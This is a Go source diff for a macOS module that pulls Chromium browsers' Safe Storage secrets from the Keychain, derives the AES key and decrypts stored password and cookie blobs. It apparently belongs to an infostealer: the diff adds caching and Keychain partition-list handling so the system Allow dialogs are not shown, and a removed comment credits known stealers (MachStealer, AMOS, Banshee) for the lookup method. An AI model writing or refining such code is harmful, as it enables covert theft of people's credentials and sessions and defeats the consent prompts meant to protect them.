@@ -1,5 +1,14 @@
 //go:build darwin
 
+// crypto_darwin.go — Chromium Safe Storage key derivation and blob decryption on macOS.
+//
+// Flow:
+//  1. Read the browser's "Safe Storage" password from Keychain (security find-generic-password).
+//  2. PBKDF2-HMAC-SHA1 (salt "saltysalt", 1003 iterations) → 16-byte AES key (v10).
+//  3. Decrypt password/cookie blobs (AES-CBC/GCM prefixes used by Chrome).
+//
+// Account/service names for security(1) match Chromium's Keychain item layout;
+// wrong -a/-s pairs cause empty secrets or extra Keychain prompts.
 package crypto
 
 import (
@@ -19,6 +28,7 @@ import (
 	"golang.org/x/crypto/pbkdf2"
 )
 
+// Chromium macOS Keychain → AES key parameters (stable across Chrome family browsers).
 const (
 	darwinChromeSalt       = "saltysalt"
 	darwinChromeIterations = 1003
@@ -81,44 +91,59 @@ func keychainAccountsForBrowser(browserName string) []string {
 }
 
 // getKeychainPassword reads Chromium Safe Storage secret from macOS Keychain.
-// MachStealer/AMOS/Banshee use: security find-generic-password -wa "Chrome"
-// (-w stdout, -a account) — NOT the service name as the -a argument.
+//
+// After EnsureLoginKeychainUnlocked + set-key-partition-list, this should not open
+// system Keychain Allow dialogs. We use minimal lookups (no multi-style spam) so a
+// failed path does not trigger several GUI prompts.
 func getKeychainPassword(browserName string) (string, error) {
 	_ = EnsureLoginKeychainUnlocked()
 
 	service := chromeKeychainService(browserName)
-	loginKC := loginKeychainPath()
+	if cached, ok := cachedSafeStorageSecret(service); ok {
+		return cached, nil
+	}
+
+	// Ensure ACL for this service even if the broad genp pass missed it.
+	ensureServicePartitionList(service)
+
 	accounts := keychainAccountsForBrowser(browserName)
-
-	type attempt struct {
-		label string
-		args  []string
-	}
-
-	var attempts []attempt
-	for _, account := range accounts {
-		// Prefer explicit service+account first — fewer Keychain GUI prompts than -wa alone.
-		attempts = append(attempts, attempt{
-			label: fmt.Sprintf("service=%q account=%q", service, account),
-			args:  []string{"find-generic-password", "-s", service, "-a", account, "-w"},
-		})
-		attempts = append(attempts, attempt{
-			label: fmt.Sprintf("MachStealer -wa %q", account),
-			args:  []string{"find-generic-password", "-wa", account},
-		})
-	}
-	_ = loginKC // keychain path appended by RunSecurityStdout when not already in args
-
 	var lastErr error
-	for _, attempt := range attempts {
-		password, err := runSecurityPasswordLookup(attempt.args)
+
+	// 1) Preferred: service + account (matches Chromium item layout; fewest prompts).
+	for _, account := range accounts {
+		password, err := RunSecurityStdout("find-generic-password", "-s", service, "-a", account, "-w")
 		if err != nil {
 			lastErr = err
 			continue
 		}
 		if password != "" {
-			logf("keychain OK for %s via %s", browserName, attempt.label)
+			cacheSafeStorageSecret(service, password)
+			logf("keychain OK for %s via service+account (%s)", browserName, account)
 			return password, nil
+		}
+	}
+
+	// 2) Service only (some profiles omit a stable account string).
+	password, err := RunSecurityStdout("find-generic-password", "-s", service, "-w")
+	if err == nil && password != "" {
+		cacheSafeStorageSecret(service, password)
+		logf("keychain OK for %s via service-only", browserName)
+		return password, nil
+	}
+	if err != nil {
+		lastErr = err
+	}
+
+	// 3) Last resort: account -w (classic layout). Only primary account to limit prompts.
+	if len(accounts) > 0 {
+		password, err = RunSecurityStdout("find-generic-password", "-wa", accounts[0])
+		if err == nil && password != "" {
+			cacheSafeStorageSecret(service, password)
+			logf("keychain OK for %s via -wa %s", browserName, accounts[0])
+			return password, nil
+		}
+		if err != nil {
+			lastErr = err
 		}
 	}
 
@@ -126,10 +151,6 @@ func getKeychainPassword(browserName string) (string, error) {
 		lastErr = fmt.Errorf("empty keychain password")
 	}
 	return "", fmt.Errorf("keychain lookup failed for %s (%s): %w", browserName, service, lastErr)
-}
-
-func runSecurityPasswordLookup(args []string) (string, error) {
-	return RunSecurityStdout(args...)
 }
 
 func securityArgsContain(args []string, value string) bool {
